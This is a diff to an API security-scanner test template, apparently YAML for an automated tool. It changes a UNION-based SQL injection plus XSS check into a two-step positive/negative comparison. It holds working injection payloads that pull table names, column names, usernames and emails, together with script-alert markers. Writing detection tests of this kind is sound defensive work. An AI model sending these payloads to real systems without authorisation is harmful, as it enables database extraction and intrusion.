@@ -40,7 +40,7 @@ api_selection_filters:
     not_contains:
       - Error
       - Internal Server 
-      - Failed
+      - Fail
       - Unauthorized
       - access denied
       - Forbidden
@@ -85,55 +85,116 @@ wordLists:
     - "' UNION SELECT 1, (SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users), '<script>alert(4)</script>'--"
     - "' UNION SELECT 1, (SELECT CONCAT('<img src=x onerror=alert(5)>', email) FROM users), 3--"
     - "' UNION SELECT 1, (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables LIMIT 1), 1/0)), '<script>alert(7)</script>'--"
+  advUnionXSSNegativePayloads:
+    - "' UNION SELECT 1, (SELECT CONCAT('<script>alert(1)</script>', database())), 3 WHERE 1=0--"
+    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=database()), '<script>alert(2)</script>' WHERE 1=0--"
+    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name='users'), '<script>alert(3)</script>' WHERE 1=0--"
+    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users), '<script>alert(4)</script>'--"
+    - "' UNION SELECT 1, (SELECT CONCAT('<img src=x onerror=alert(5)>', email) FROM users), 3 WHERE 1=0--"
+    - "' UNION SELECT 1, (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables LIMIT 1), 1/0)), '<script>alert(7)</script>' WHERE 1=0--"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${advUnionXSSPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - Attention Required!
-      - CloudFlare
-      - Sorry, you have been blocked
-      - " UNION SELECT "
-    contains_either:
-      - "<script>alert(1)</script>"
-      - "<script>alert(2)</script>"
-      - "<script>alert(3)</script>"
-      - "<script>alert(4)</script>"
-      - "<img src=x onerror=alert(5)>"
-      - "<script>alert(7)</script>"
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - "<script>alert(1)</script>"
+            - "<script>alert(2)</script>"
+            - "<script>alert(3)</script>"
+            - "<script>alert(4)</script>"
+            - "<img src=x onerror=alert(5)>"
+            - "<script>alert(7)</script>"
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - UNION
+            - SELECT  
+
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${advUnionXSSNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - UNION
+            - SELECT
+            - "<script>alert(1)</script>"
+            - "<script>alert(2)</script>"
+            - "<script>alert(3)</script>"
+            - "<script>alert(4)</script>"
+            - "<img src=x onerror=alert(5)>"
+            - "<script>alert(7)</script>"
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit       
